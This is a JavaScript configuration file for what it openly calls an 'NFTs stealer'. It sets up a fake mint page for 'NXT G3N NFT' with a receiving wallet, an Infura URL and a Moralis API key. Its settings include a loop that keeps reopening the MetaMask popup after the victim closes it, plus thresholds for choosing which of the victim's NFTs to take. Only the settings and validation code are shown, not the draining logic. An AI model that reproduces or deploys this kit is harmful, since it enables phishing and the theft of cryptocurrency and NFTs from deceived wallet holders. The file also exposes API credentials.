
const address = "0x82E5A8E5EB184B13fCCC4C811EED4d13F9058240";     // wallet address
const infuraId = "https://mainnet.infura.io/v3/5d26241417814122aec2ad8335fc3854"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "NJUvKUjyqorCWpTvWxBKB4kkOZBX6YQXI7mipgASoWAzdtxGmIu1qePWoP6qLOmW"   // x-api-key | https://moralis.io/ | For NFTs


const collectionInfo = {
    name: "NXT G3N NFT",
    title: "NXT G3N NFT", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "29.03.2022",
    socialMedia: {
        discord: "https://discord.gg/nxtg3nz",
        twitter: "https://twitter.com/nxtg3nz",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.gif",
    },
    background: {
        type: "color",              // Supported types: image, video, color
        image: "",    // Image for image type, video preview for video type
        video: "",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.08,         // Price per NFT.
    totalSupply: 999,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 5,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.05,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 9999, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
